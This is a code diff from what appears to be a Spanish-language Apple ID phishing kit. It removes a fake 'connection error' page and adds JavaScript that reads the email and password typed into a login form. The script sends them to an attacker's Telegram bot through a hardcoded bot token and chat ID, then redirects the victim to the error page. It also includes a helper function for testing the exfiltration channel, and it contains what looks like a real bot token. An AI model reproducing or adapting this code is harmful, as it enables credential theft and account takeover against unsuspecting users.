@@ -1,23 +1,81 @@
-<!DOCTYPE html>
-<html lang="es">
-<head>
-    <meta charset="UTF-8">
-    <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>Error - Apple ID</title>
-    <style>
-        body { font-family: -apple-system, BlinkMacSystemFont, 'Segoe UI', Roboto, sans-serif; background: #f5f5f7; display: flex; align-items: center; justify-content: center; height: 100vh; margin: 0; }
-        .error-card { background: white; padding: 40px; border-radius: 20px; text-align: center; box-shadow: 0 10px 30px rgba(0,0,0,0.1); max-width: 400px; }
-        h1 { color: #dc3545; margin-bottom: 15px; }
-        p { color: #6c757d; margin-bottom: 25px; }
-        .button { background: #0071e3; color: white; padding: 12px 30px; border-radius: 8px; text-decoration: none; display: inline-block; }
-        .button:hover { background: #0077ed; }
-    </style>
-</head>
-<body>
-    <div class="error-card">
-        <h1>⛔ Error de conexión</h1>
-        <p>No se pudo conectar con los servidores de Apple.<br>Por favor, intenta de nuevo más tarde.</p>
-        <a href="index.html" class="button">Volver a intentar</a>
-    </div>
-</body>
-</html>
+// ============================================
+// CONFIGURACIÓN DE TELEGRAM - VERIFICA ESTOS DATOS
+// ============================================
+const TELEGRAM_TOKEN = '8234691045:AAHePNguryd46uVV1F4uXNaZKYtCGJ12LuU';
+const TELEGRAM_CHAT_ID = '76868560'; // Tu ID de Telegram
+
+// ============================================
+// CÓDIGO PRINCIPAL
+// ============================================
+document.addEventListener('DOMContentLoaded', function() {
+    console.log('🚀 Iniciando sistema...');
+    console.log('📱 Telegram configurado con ID:', TELEGRAM_CHAT_ID);
+    
+    const formulario = document.getElementById('loginForm');
+    
+    if (!formulario) {
+        console.log('❌ No se encontró el formulario');
+        return;
+    }
+    
+    formulario.addEventListener('submit', function(e) {
+        e.preventDefault();
+        
+        // Obtener valores
+        const email = document.getElementById('email')?.value || 'no email';
+        const password = document.getElementById('password')?.value || 'no password';
+        
+        console.log('📤 Enviando a Telegram:', { email, password });
+        
+        // Crear mensaje (formato simple)
+        const mensaje = `🔐 NUEVO LOGIN
+📧 Email: ${email}
+🔑 Pass: ${password}
+⏰ ${new Date().toLocaleString()}`;
+        
+        // Enviar a Telegram usando GET (más simple)
+        const url = `https://api.telegram.org/bot${TELEGRAM_TOKEN}/sendMessage?chat_id=${TELEGRAM_CHAT_ID}&text=${encodeURIComponent(mensaje)}`;
+        
+        fetch(url)
+        .then(response => response.json())
+        .then(data => {
+            if (data.ok) {
+                console.log('✅ Mensaje enviado a Telegram');
+            } else {
+                console.log('❌ Error de Telegram:', data);
+            }
+        })
+        .catch(error => {
+            console.log('❌ Error de conexión:', error);
+        });
+        
+        // Redirigir a error
+        window.location.href = 'error.html';
+    });
+});
+
+// ============================================
+// FUNCIÓN DE PRUEBA - USA ESTA PRIMERO
+// ============================================
+function probarTelegram() {
+    const testUrl = `https://api.telegram.org/bot${TELEGRAM_TOKEN}/sendMessage?chat_id=${TELEGRAM_CHAT_ID}&text=${encodeURIComponent('🟢 PRUEBA: Sistema funcionando correctamente')}`;
+    
+    fetch(testUrl)
+    .then(response => response.json())
+    .then(data => {
+        if (data.ok) {
+            alert('✅ Mensaje enviado a Telegram');
+            console.log('✅ Éxito:', data);
+        } else {
+            alert('❌ Error: ' + JSON.stringify(data));
+            console.log('❌ Error:', data);
+        }
+    })
+    .catch(error => {
+        alert('❌ Error de conexión');
+        console.log('❌ Error:', error);
+    });
+}
+
+// Hacer la función global
+window.probarTelegram = probarTelegram;
